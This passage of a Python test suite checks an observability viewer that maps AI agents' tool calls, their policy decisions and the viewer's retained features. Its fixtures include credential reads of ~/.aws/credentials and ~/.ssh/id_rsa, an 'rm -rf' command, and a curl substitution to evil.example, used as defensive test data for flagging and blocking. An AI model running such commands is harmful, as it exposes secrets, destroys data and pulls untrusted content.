    return {"event": "PreToolUse", "session_id": run, "seq": seq, "ts": ts, "tool_use_id": f"{run}{seq}", "tool_name": "Read",
            "tool_input": {"file_path": f"src/f{seq}.py"}, "policy": {"decision": "allow"}, "why": {"run": run, "node": f"ev:{seq}"}, **unread}


class Horizon(unittest.TestCase):
    """HORIZON: where the agents went, from the calls' arguments, rules and runs, drawn on a canvas."""

    def test_each_call_is_placed_on_its_ring_graded_and_kept_in_seq_order(self):
        needs_node(self)
        recs = [hz_call(4, "Bash", {"command": "cat /home/u/.aws/credentials"}, "r2", "flag", [("TK-F005", "secrets_access")]),
                hz_call(1, "Bash", {"command": "pytest tests/test_refund.py -x"}),
                hz_call(3, "Read", {"file_path": "/home/u/shop/src/refunds.py"}),
                hz_call(6, "WebFetch", {"url": "https://Docs.Stripe.com/refunds?x=1"}, "r2"),
                hz_call(7, "Bash", {"command": "rm -rf /tmp/x"}, "r2", "deny", [("TK-D004", "recursive delete of root or home")]),
                hz_call(8, "send_email", {}, decision="ask", rules=[("TK-P001", "an email outside the company")]),
                {"event": "tk_alert", "session_id": "r1", "tk_seq": 9, "v2": {"tool_use_id": "c8", "approval": "approve"}},
                hz_call(10, "WebSearch", {}),
                {"event": "tk_alert", "session_id": "r1", "tk_seq": 11, "ts": 1011, "title": "EFFECT · connect api.unknown.example:443",
                 "v2": {"effect": {"kind": "connect", "target": "api.unknown.example:443", "claim": None}}},
                {**hz_call(12, "Read", {"file_path": "/etc/hosts"}), "analysis": True},
                hz_call(13, "Read", {"file_path": "notes/ticket.md"}, "r3", cwd=""),
                hz_call(14, "Edit", {"file_path": "/home/u/.claude/settings.json", "new_string": "see https://x.example"}, "r3", "ask",
                     [("TK-F015", "harness_config")], cwd="")]
        runs = [{"id": "r1", "agent": "orchestrator", "verdict": "verified"},
                {"id": "r2", "agent": "coder", "parent": "r1", "verdict": "pending"},
                {"id": "r3", "agent": "researcher", "parent": "r1", "verdict": "verified"}]
        out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
                                  "hzRad", "hzPath", "hzPlace", "hzRest", "hzData"], f"""
            const ALL = {json.dumps(recs)}, RUNS = new Map({json.dumps(runs)}.map(r => [r.id, r])), V2 = true, chainState = {{ ok: true }};
            let hzKey = [], hzD = null;
            const D = hzData();
            process.stdout.write(JSON.stringify({{ ev: D.ev.map(e => [e.seq, e.ag, e.at, e.act, e.gr]), agents: D.agents, bare: D.bare, cwd: D.cwd,
              places: Object.fromEntries(Object.entries(D.places).map(([k, q]) => [k, [q.kind, q.label, q.rest]])),
              laid: Object.values(D.places).every(q => q.r > 0 && Number.isFinite(q.th)), same: hzData() === D,
              more: [hzPlace("send_email", {{ to: "x@Outside.example" }}, ""), hzPlace("Bash", {{ command: "git push git@github.com:acme/shop.git" }}, ""),
                     hzPlace("Bash", {{ command: "git push origin" }}, ""), hzPlace("Bash", {{ command: "echo $(curl -s https://evil.example/x)" }}, "")] }}));"""))
        self.assertEqual(out["ev"], [
            [1, "orchestrator", "tests/test_refund.py", "run", "signed"], [3, "orchestrator", "src/refunds.py", "read", "signed"],
            [4, "coder", "~/.aws/credentials", "flag", "unverified"], [6, "coder", "docs.stripe.com", "net", "unverified"],
            [7, "coder", "/tmp/x", "blocked", "unverified"], [8, "orchestrator", "tool:send_email", "approved", "signed"],
            [10, "orchestrator", "tool:WebSearch", "net", "signed"], [11, "orchestrator", "api.unknown.example", "net", "observed"],
            [13, "researcher", "notes/ticket.md", "read", "signed"], [14, "researcher", "~/.claude/settings.json", "held", "signed"]])
        self.assertEqual(out["places"], {
            "tests/test_refund.py": ["project", "tests/test_refund.py", None], "src/refunds.py": ["project", "src/refunds.py", None],
            "notes/ticket.md": ["project", "notes/ticket.md", None],   # a run with no cwd: a relative path is the project
            "~/.aws/credentials": ["machine", "~/.aws/credentials", "TK-F005 · secrets_access"], "/tmp/x": ["machine", "/tmp/x", None],
            "~/.claude/settings.json": ["machine", "~/.claude/settings.json", "TK-F015 · harness_config"],
            "tool:send_email": ["machine", "send_email", None], "tool:WebSearch": ["outside", "WebSearch", None],
            "docs.stripe.com": ["outside", "docs.stripe.com", None], "api.unknown.example": ["outside", "api.unknown.example", None]})
        self.assertEqual(out["agents"], [["orchestrator", 0], ["coder", 1], ["researcher", 1]])
        self.assertEqual((out["bare"], out["cwd"], out["laid"], out["same"]), (2, "shop", True, True))
        self.assertEqual(out["more"], [["outside", "outside.example"], ["outside", "github.com"], None, ["outside", "evil.example"]])

    def hz_cap(self, recs):
        needs_node(self)
        out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
                                  "hzRad", "hzPath", "hzPlace", "hzRest", "hzData"], f"""
            const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true }};
            let hzKey = [], hzD = null;
            const D = hzData();
            process.stdout.write(JSON.stringify({{ ev: D.ev.map(e => [e.run, e.seq]), calls: D.calls }}));"""))
        self.assertEqual((len(out["ev"]), out["calls"]), (500, len(recs)))
        return out["ev"]

    def test_the_cap_keeps_the_newest_why_log_calls_of_all_runs_together(self):
        """A why log's seq counts within its run (why.server.tape): ordered by seq, an older 600-call why run kept a
        newer one's calls off the map. A log whose ts the tape could not read shows it as now: it sorts oldest."""
        ev = self.hz_cap([why_call(i, "old", 1000 + i) for i in range(1, 601)] + [why_call(i, "new", 5000 + i) for i in range(1, 4)]
                         + [why_call(i, "bad", 9000 + i, ts_unread=True) for i in range(1, 601)])
        self.assertEqual(ev[0], ["old", 104])
        self.assertEqual(ev[-3:], [["new", 1], ["new", 2], ["new", 3]])

    def test_the_clock_runs_from_the_first_readable_move_when_an_unread_one_is_drawn(self):
        """An unread move, timed now, came first and every later move worked out negative: T+ sat at 00:00:00."""
        needs_node(self)
        recs = [why_call(1, "bad", 9999, ts_unread=True)] + [why_call(i, "w", 100 + 60 * i) for i in range(1, 4)]
        out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
                                  "hzRad", "hzPath", "hzPlace", "hzRest", "hzData", "hzSecs"], f"""
            const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true }};
            let hzKey = [], hzD = null;
            const D = hzData();
            process.stdout.write(JSON.stringify([D.ev.map(e => e.run), [undefined, ...D.ev].map(cur => hzSecs(D.ev, cur))]));"""))
        self.assertEqual(out, [["bad", "w", "w", "w"], [0, 0, 0, 60, 120]])

    def test_the_cap_orders_v1_calls_by_the_signers_time_not_the_agents(self):
        """A v1 event's ts comes from the client (tracekitd's setdefault): a call that backdates its ts stays on the map."""
        recs = [{**hz_call(i, "Read", {"file_path": f"src/f{i}.py"}), "ts_signed": 1000 + i} for i in range(1, 601)]
        ev = self.hz_cap(recs + [{**hz_call(601, "Read", {"file_path": "~/.ssh/id_rsa"}), "ts": 1, "ts_signed": 1601}])
        self.assertEqual((ev[0], ev[-1]), (["r1", 102], ["r1", 601]))

    def test_a_place_named_like_an_object_key_is_a_place(self):
        """A call to http://constructor/ made every frame throw (seen[e.at].push), and a place named __proto__ set the
        maps' prototype: the page's maps keyed by what records hold have no prototype."""
        needs_node(self)
        recs = [hz_call(1, "Bash", {"command": "curl http://constructor/x"}), hz_call(2, "Bash", {"command": "curl http://__proto__/y"}),
                hz_call(3, "WebFetch", {"url": "https://toString.example/"}, "constructor")]
        runs = [{"id": "r1", "agent": "__proto__", "verdict": "verified"}, {"id": "constructor", "agent": "constructor", "verdict": "verified"}]
        out = json.loads(page_js(["FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
                                  "hzRad", "hzPath", "hzPlace", "hzRest", "hzData", "dict", "HZACT", "HZSYM", "HZWORST",
                                  "hzRgba", "hzDraw", "hzFrame"], f"""
            const ALL = {json.dumps(recs)}, RUNS = new Map({json.dumps(runs)}.map(r => [r.id, r])), V2 = true, chainState = {{ ok: true }};
            let hzKey = [], hzD = null, frames = 0, PAGE = "horizon";
            const ctx = new Proxy({{}}, {{ get: (o, k) => k in o ? o[k] : () => ({{ addColorStop() {{}}, width: 10 }}) }});
            const cv = {{ clientWidth: 800, clientHeight: 600, width: 0, height: 0, getContext: () => {{ frames++; return ctx; }} }};
            const $ = id => id === "hzcv" ? cv : null, window = {{}}, document = {{ createElement: () => ({{ width: 0, height: 0, getContext: () => ctx }}) }};
            const css = n => n === "--hz-gas" ? "#fff6e4 #ffbc64 #ee8028 #6e2408" : n === "--mono" ? "monospace" : "#3cc8f0";
            const matchMedia = () => ({{ matches: true }}), requestAnimationFrame = () => {{}};
            HZ.d = hzData(); HZ.t = HZ.d.ev.length; HZ.col = dict(HZ.d.agents.map(([a]) => [a, "#d98bff"]));
            hzDraw();
            process.stdout.write(JSON.stringify([frames, Object.keys(HZ.d.places).sort(), Object.keys(Object.prototype),
                                                 typeof FIELD.constructor, typeof FILE_TOOLS.toString]));"""))
        self.assertEqual(out, [1, ["__proto__", "constructor", "tostring.example"], [], "undefined", "undefined"])
        # every other map the page keys by a record's string (a node id, a tool, a source) is one with no prototype
        script = PAGE[PAGE.index("<script"):]
        self.assertEqual(re.findall(r"\b(?:by|depth|cols|pos|sev|sy|ty|places|parent|groups|seen|col)\s*[=:]\s*\{\}", script), [])
        self.assertNotIn("Object.fromEntries(d.nodes", script)

    def test_calls_without_arguments_are_said_on_the_page(self):
        self.assertIn("calls have their arguments only as a commitment here, so each is placed by its tool", PAGE)
        self.assertIn("A TOOL, NO FILE OR HOST RECORDED", PAGE)

    def test_reduced_motion_draws_a_still_frame_on_each_change_and_no_loop(self):
        needs_node(self)
        out = json.loads(page_js(["dict", "HZ", "HZACT", "HZSYM", "HZWORST", "hzRad", "hzRgba", "hzDraw", "hzFrame"], """
            const ctx = new Proxy({}, { get: (o, k) => k in o ? o[k] : () => ({ addColorStop() {}, width: 10 }) });
            let frames = 0, reduce = true, PAGE = "horizon";
            const queued = [], cv = { clientWidth: 800, clientHeight: 600, width: 0, height: 0, getContext: () => { frames++; return ctx; } };
            const $ = id => id === "hzcv" ? cv : null, window = {}, document = { createElement: () => ({ width: 0, height: 0, getContext: () => ctx }) };
            const css = n => n === "--hz-gas" ? "#fff6e4 #ffbc64 #ee8028 #6e2408" : n === "--mono" ? "monospace" : "#3cc8f0";
            const matchMedia = () => ({ matches: reduce }), requestAnimationFrame = f => queued.push(f);
            const ev = (seq, at, act) => ({ t: seq, seq, ag: "coder", at, act, gr: "signed", run: "r1", w: "" });
            HZ.d = { ev: [ev(1, "src/a.py", "read"), ev(2, "~/.ssh", "blocked"), ev(3, "x.example", "net")], dirs: [{ label: "SRC/", r: .165, th: 0 }],
                     agents: [["coder", 0]], cwd: "shop", places: { "src/a.py": { kind: "project", label: "src/a.py", r: .24, th: .5, rest: null },
                       "~/.ssh": { kind: "machine", label: "~/.ssh", r: .565, th: 2, rest: "TK-F005 · secrets_access" },
                       "x.example": { kind: "outside", label: "x.example", r: .85, th: 4, rest: null } } };
            Object.assign(HZ, { t: 3, col: { coder: "#d98bff" }, pick: "src/a.py", comet: { ag: "coder", to: "x.example", from: "~/.ssh", t0: 0 } });
            const seen = [];
            hzDraw(); hzDraw(); seen.push([frames, queued.length, HZ.raf, !!HZ.comet]);   // still: a frame each time, no loop, no comet
            reduce = false; hzDraw(); seen.push([frames, queued.length]);                  // moving: drawn on the next animation frame
            queued.shift()(16); seen.push([frames, queued.length]);                        // ...which asks for the one after
            PAGE = "runs"; queued.shift()(32); seen.push([frames, queued.length]);         // off the page the loop stops
            process.stdout.write(JSON.stringify(seen));"""))
        self.assertEqual(out, [[2, 0, 0, True], [2, 1], [3, 1], [3, 0]])


PAGE_TEXT = " ".join(PAGE.split())
APPROVALS_PAGE = observe.read_text(os.path.join(os.path.dirname(observe.UI), "approvals.html"))
RUNS_PAGE = observe.read_text(os.path.join(os.path.dirname(observe.UI), "runs.html"))


class NothingLost(unittest.TestCase):
    """v7 moved today's viewer into pages and a run's views (the decision of 27 Oct 17:55 in #439): one check per row of
    its table and per item of the Keep list, so a later change that drops a feature fails here."""

    def test_every_global_page_and_run_view_is_reachable(self):
        needs_node(self)
        out = json.loads(page_js(["PAGES", "RVIEWS", "show", "centre"], """
            let PAGE = "desk", RV = "calls", CALLSLOG = false; const goLive = () => { PAGE = "run"; }, seen = {};
            for (const v of [...PAGES, ...RVIEWS, "timeline", "map"]) { show(v); seen[v] = [PAGE, RV, centre()]; }
            process.stdout.write(JSON.stringify(seen));"""))
        self.assertEqual(out, {
            "desk": ["desk", "calls", "desk"], "runs": ["runs", "calls", "desk"], "live": ["run", "calls", "desk"],
            "approvals": ["approvals", "calls", "desk"], "permissions": ["permissions", "calls", "permissions"],
            "horizon": ["horizon", "calls", "desk"], "map": ["horizon", "calls", "desk"],   # MAP: HORIZON's first name
            "influence": ["influence", "calls", "influence"], "overview": ["run", "overview", "overview"],
            "calls": ["run", "calls", "desk"], "waterfall": ["run", "waterfall", "desk"], "graph": ["run", "graph", "graph"],
            "why": ["run", "why", "why"], "agents": ["run", "agents", "agents"], "evidence": ["run", "evidence", "evidence"],
            "timeline": ["run", "calls", "timeline"]})   # the why log's TIMELINE: CALLS with its events

    def test_the_help_names_every_page_and_run_view(self):
        """The help kept v6's buttons (DESK · RUNS · OVERVIEW · TIMELINE …) after v7 moved them."""
        helptext = html.unescape(re.sub(r"<[^>]+>|\s+", " ", PAGE[PAGE.index('id="help"'):PAGE.index("</table>", PAGE.index('id="help"'))]))
        names = re.search(r"const PAGES = (\[[^\]]+\])", PAGE)[1], re.search(r"const RVIEWS = (\[[^\]]+\])", PAGE)[1]
        for name in json.loads(names[0]) + [{"waterfall": "timeline"}.get(v, v) for v in json.loads(names[1])]:
            with self.subTest(name=name):
                self.assertIn(name.upper(), helptext)
        self.assertNotIn("WHY DID IT HAPPEN?", helptext)   # v6's name for WHY

    def test_a_phone_stacks_each_page_and_shows_a_tape_row_as_a_two_line_card(self):
        """At 390px the run header overlapped its own title, the stats strip ran past the edge, the lanes' times
        overlapped and the inspector came before the run's view."""
        css = PAGE[PAGE.index("<style>"):PAGE.index("</style>")]
        phone = css[css.index("/* phones: every page stacks"):]
        for rule in (".tape thead {\n        display: none", "grid-template-columns: 72px 56px minmax(0, 1fr)",
                     ".tape tr.row td.tgt {\n        grid-column: 1/-1", ".pg-run main>.detail {\n        order: 3",
                     ".ticker {\n        flex-wrap: wrap", ".runhead,\n      .wsplit {\n        grid-template-columns: minmax(0, 1fr)"):
            with self.subTest(rule=rule):
                self.assertIn(rule, phone)
        self.assertIn("tickStep(t1 - t0, Math.max(2, (W - labelW) / 90))", PAGE)   # the lanes: a tick per 90px at most

    def test_the_why_logs_timeline_is_a_click_away_on_calls_and_back(self):
        """v7 left the why log's TIMELINE (agent select, type segments, flagged only, search) reachable only by a
        #view=timeline link: CALLS has a button to it, and it a button back."""
        needs_node(self)
        out = json.loads(page_js(["esc", "KINDS", "PAGES", "RVIEWS", "show", "centre", "kindChips"], """
            let PAGE = "run", RV = "calls", CALLSLOG = false, F = { kind: null }, WHY = { runs: [] };
            const seen = [], click = html => show(/data-rv="([^"]+)"/.exec(html)[1]);
            click(kindChips()); seen.push([PAGE, RV, centre()]);
            show("calls"); seen.push(centre());
            WHY = null; seen.push(kindChips().includes("data-rv"));   // with no why logs there is nothing to show
            process.stdout.write(JSON.stringify(seen));"""))
        self.assertEqual(out, [["run", "calls", "timeline"], "desk", False])
        self.assertIn('data-rv="calls">← THE RUN\'S CALLS</button>', PAGE)

    def test_each_page_places_the_panels_it_had(self):
        css = PAGE[PAGE.index("<style>"):PAGE.index("</style>")]
        for rule in ("body.pg-run main>.p.agents", "body.pg-run main>.p.mix", "body.pg-run main>.p.detail",
                     "body.pg-run.rv-calls:not(.callslog) main>.p.tape", "body.pg-run.rv-waterfall main>.p.lanes",
                     "body.pg-run.wv main>.p.whyv", "body.pg-runs main>.p.runsp", "body.pg-approvals main>.p.apprp",
                     "body.pg-permissions main>.p.whyv", "body.pg-horizon main>.p.hzp", "body.pg-influence main>.p.whyv"):
            self.assertIn(rule, css)
        # DESK is today's grid: every panel, the stats strip and NEEDS YOU
        self.assertIn("body:not(.pg-desk) main>.p", css)
        for panel in ("agents", "tape", "alerts", "mix", "lanes", "reason", "files", "detail"):
            self.assertIn(f'<section class="p {panel}">', PAGE)

    def test_todays_features_are_each_still_there(self):
        rows = {
            "stats strip": ['["RUNS", scope ? 1', '"HIGH ALERTS"', '"RECORDS", signed'],
            "chain badge": ["CHAIN ✓ ${chainState.n} SIGNED RECORDS"],
            "clock and zone": ['$("clock").textContent'],
            "tape columns": ["TIME", "AGENT", "EVT", "TOOL", "TARGET / TEXT", "STATUS", "MS"],
            "alerts with why": ['<span class="src">WHY</span>'],
            "tool mix": ["function renderMix()"], "lanes": ["TIMELINE · ONE LANE PER AGENT"],
            "timeline by call and by agent": ["function renderWaterfall()", "TIMELINE · ONE ROW PER CALL",
                                              'data-wfby="call"', 'data-wfby="agent"', '<pattern id="wfhatch"',
                                              '"waiting for a person"'],
            "reasoning": ["REASONING<small>self-reported, not proof</small>"],
            "files": ["<th>PATH</th>", "LAST AGENT"],
            "detail, why, node": ['data-wtab="detail"', 'data-wtab="why"', 'data-wtab="node"', "LEDGER EVIDENCE · SEQ"],
            "modes": ['"STATIC"', '"BUNDLE"', '"STOPPED"', '"DISCONNECTED"', '"REPLAY"', 'id="lost"'],
            "replay": ['id="play"', 'id="speed"', 'id="scrub"', 'id="rback"', 'id="rfwd"', 'data-jump="deny"',
                       'data-jump="hold"', 'data-jump="gap"', 'id="rlive"'],
            "why views": ["function overviewView(", "function timelineView(", "function whyView(", "function graphView(",
                          "function agentsView(", "function influenceView(", "function runsView(", "function renderNode(",
                          "FIND THE CAUSE", "RUN TEST", "inferred links", "ruled-out tests", "ACTUAL SIZE",
                          "CLEAR HIGHLIGHT", "SHOW WHAT IT REACHED", "INFLUENCE MATRIX", "CRITICAL PATH",
                          "HOW TO READ THE EVIDENCE"],
            "new v7 pieces": ["function renderRunHead()", "function renderRunsPage()", "function renderApprovalsPage()",
                              "function evidenceView(", "NEEDS YOU", "WHY THIS DECISION", "WAITING FOR YOU"],
            "evidence": ["function evidenceOf(", "CHAIN · EACH SIGNED RECORD IN ORDER",
                         "CHECKS · THE VIEWER'S VERIFIER REPORT", '<div class="stamp ${esc(e.stamp[0])}">',
                         "reviewHtml(r, false)", "VERIFIER REPORT · AS THE VIEWER PRINTED IT"],
            "graph graded by proof": ["function edgeGrade(", "function netEffects(", "signed: both ends are signed records",
                                      "recorded flow", "observed: a sensor saw it",
                                      "blocked: its signed decision stopped the call", "network effect\")} a sensor saw"],
            "why cause chains": ["function whyText(", '"COPY THIS EXPLANATION"', 'data-wopen="${esc(c.node)}"',
                                 'data-tkseq="${esc(seq)}">record&nbsp;${esc(seq)}',
                                 "tracekit why test ${path} --system ${prog} --remove ${shq(c.intervention)} --target ${tq}"],
            "inspector: said vs did, whose words": ["SAID VS DID · SELF-REPORTED, NOT PROOF", "function saidMark(",
                                                    'b: "BACKED", w: "AGENT\'S WORD", x: "CONTRADICTED"',
                                                    "WHOSE WORDS · WHERE THE INSTRUCTION", "function whoseWords(",
                                                    'typed: "TYPED", relayed: "RELAYED", web: "TOOL/WEB"'],
            "horizon": ["function renderHorizon()", "function hzFrame(", "EVENT HORIZON", "▶ REPLAY", "FOLLOW AN AGENT",
                        'data-hzv="orbit"', 'data-hzv="top"', "HOW TO READ IT", "MISSION CLOCK"],
            "honesty tips": ["A row is a signed record of the hash-chained ledger unless it says ANALYSIS",
                             "Times are this browser's local time",
                             "Reasoning is what the model reported about itself; actions are what it did",
                             "trust.json pins the signer's log key; that check, not this page, is the evidence",
                             "Download the bundle and check it with tracekit verify from the signed release: that, "
                             "not this page, is the evidence", "THE VIEWER'S CHECK, OPERATOR-SIDE", "operator-side"],
            "security": ["const esc = s =>", "const vis = s =>", "\\\\u\" + c.charCodeAt(0)"],
        }
        for feature, marks in rows.items():
            for mark in marks:
                with self.subTest(feature=feature, mark=mark):
                    self.assertIn(mark, PAGE_TEXT)

    def test_every_command_and_key_is_still_parsed(self):
        for cmd in ("AGT", "TOOL", "FILE", "FIND", "FLAG", "CLR", "SEQ", "HELP", "PAUSE", "PLAY", "SPEED"):
            with self.subTest(cmd=cmd):
                self.assertIn(f'case "{cmd}":', PAGE)
        for key in ('e.key === "/"', 'e.key === "Escape"', 'e.key === "f"', 'e.key === "?"', 'e.key === "t"',
                    '" ": togglePlay', "ArrowLeft:", "ArrowRight:", 'd: () => jump("deny")', 'h: () => jump("hold")',
                    'g: () => jump("gap")', "l: () => R && stopRun()", "/^[1-7]$/.test(e.key)"):
            with self.subTest(key=key):
                self.assertIn(key, PAGE)

    def test_the_run_and_approval_pages_keep_their_controls(self):
        for mark in ('id="run"', 'id="agent"', 'id="tenant"', 'id="since"', 'id="until"', 'id="verdict"', 'id="gaps"',
                     'id="denies"', 'id="approvals"', ">Log<", ">Tenant<", ">Ended<", "More runs", "More records",
                     'id="download"'):
            with self.subTest(page="runs.html", mark=mark):
                self.assertIn(mark, RUNS_PAGE)
        for mark in ('id="register"', 'id="filter"', "Expires", "Answered by", 'id="args"', 'id="reason"',
                     "Revoke the agent's approval", "5000"):
            with self.subTest(page="approvals.html", mark=mark):
                self.assertIn(mark, APPROVALS_PAGE)


if __name__ == "__main__":
    unittest.main()
